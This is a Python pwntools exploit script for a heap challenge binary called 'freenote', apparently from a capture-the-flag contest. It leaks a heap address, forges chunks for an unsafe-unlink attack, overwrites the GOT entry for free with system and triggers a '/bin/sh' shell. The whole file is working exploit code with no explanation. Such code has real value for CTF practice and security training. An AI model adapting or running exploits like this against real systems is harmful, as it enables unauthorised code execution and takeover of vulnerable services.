#!/usr/bin/env python2

from pwn import *  #pip install pwntools

#r = remote('127.0.0.1', 9990)
r = process("./freenote")
context.log_level = 'debug'

f = open("payload", "wb")

def newnote(x):
    r.recvuntil('Your choice: ')
    r.send('2\n')
    f.write('2\n')
    r.recvuntil('Length of new note: ')
    r.send(str(len(x)) + '\n')
    f.write(str(len(x)) + '\n')
    r.recvuntil('Enter your note: ')
    r.send(x)
    f.write(x)

def delnote(x):
    r.recvuntil('Your choice: ')
    r.send('4\n')
    f.write('4\n')
    r.recvuntil('Note number: ')
    r.send(str(x) + '\n')
    f.write(str(x) + '\n')

def getnote(x):
    r.recvuntil('Your choice: ')
    r.send('1\n')
    f.write('1\n')
    r.recvuntil('%d. ' % x)
    return r.recvline(keepends=False)

def editnote(x, s):
    r.recvuntil('Your choice: ')
    r.send('3\n')
    f.write('3\n')
    r.recvuntil('Note number: ')
    r.send(str(x) + '\n')
    f.write(str(x) + '\n')
    r.recvuntil('Length of note: ')
    r.send(str(len(s)) + '\n')
    f.write(str(len(s)) + '\n')
    r.recvuntil('Enter your note: ')
    r.send(s)
    f.write(s)

def quit():
    r.recvuntil('Your choice: ')
    r.send('5\n')
    f.write('5\n')

for i in range(4):
    newnote('a')
delnote(0)
delnote(2)

newnote('12345678')

s = getnote(0)[8:]
heap_addr = u64((s.ljust(8, "\x00"))[:8])
heap_base = heap_addr - 0x1940
print "heap base is at %s" % hex(heap_base)


delnote(0)
delnote(1)
delnote(3)

#gdb.attach(r)
size0 = 0x80 + 0x90 + 0x90
newnote(p64(0) + p64(size0 + 1) + p64(heap_base + 0x18) + p64(heap_base + 0x20)) #unlink
newnote("/bin/sh\x00")
newnote("a"*0x80 + p64(size0) + p64(0x90) + "a"*128 + (p64(0) + p64(0x91) + "a"*128) * 2)
delnote(3)

free_got = 0x602018
free2system = -0x3f160

editnote(0, p64(100) + p64(1) + p64(8) + p64(free_got))

s = getnote(0)
free_addr = u64((s.ljust(8, "\x00"))[:8])
system_addr = free_addr + free2system
print "system is at %s" % hex(system_addr)

editnote(0, p64(system_addr))
delnote(1)
f.close()
r.interactive()
